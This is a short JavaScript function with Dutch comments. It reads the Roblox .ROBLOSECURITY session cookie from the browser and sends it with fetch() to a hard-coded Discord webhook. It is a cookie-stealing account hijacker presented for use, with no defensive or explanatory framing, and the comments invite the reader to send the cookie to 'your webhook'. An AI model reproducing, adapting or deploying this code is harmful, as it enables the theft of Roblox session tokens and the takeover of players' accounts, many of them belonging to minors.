function getRobloxSecurityCookie() {
    // Voorbeeld: Lees de cookie en log deze
    let robloxSecurityCookie = document.cookie.match(/.ROBLOSECURITY=([^;]+)/);
    if (robloxSecurityCookie) {
        console.log("Roblox Security Cookie:", robloxSecurityCookie[1]);

        // Hier kun je de cookie naar je webhook sturen of andere acties uitvoeren
        let webhookUrl = "https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B";
        let data = {
            cookie: robloxSecurityCookie[1]
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        }).then(response => {
            console.log('Cookie verzonden naar webhook');
        }).catch(error => {
            console.error('Fout bij het verzenden naar webhook', error);
        });
    } else {
        console.error("Roblox Security Cookie niet gevonden.");
    }
}
